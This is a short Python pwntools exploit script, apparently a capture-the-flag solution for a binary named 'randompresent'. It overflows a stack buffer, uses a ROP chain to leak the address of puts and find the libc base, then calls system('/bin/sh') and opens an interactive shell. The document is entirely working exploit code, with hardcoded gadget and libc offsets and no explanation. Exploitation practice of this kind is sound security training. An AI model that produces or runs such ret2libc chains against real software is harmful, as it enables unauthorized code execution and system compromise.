#!/usr/bin/env python

from pwn import *

bin = ELF('./randompresent')
libc = ELF('./libc.so.6')

p = process('./randompresent')

#Stage 1 leaking
padding = "A"*40
put_plt = p64(bin.plt['puts'])
put_got = p64(bin.got['puts'])
pop_rdi = p64(0x0040077b)
main = p64(0x400676)
payload = padding + pop_rdi + put_got + put_plt + main

p.recvuntil('ROP me!')
p.sendline(payload)
p.recvline()
leak = u64(p.recvline().strip().ljust(8,'\x00'))

lba = leak - libc.symbols['puts']

#Stage 2 exploitation
system = p64(lba + 0x449c0)
bin_sh = p64(lba + 0x181519)
payload = padding + pop_rdi + bin_sh + system

p.recvuntil('ROP me!')
p.sendline(payload)
p.interactive()
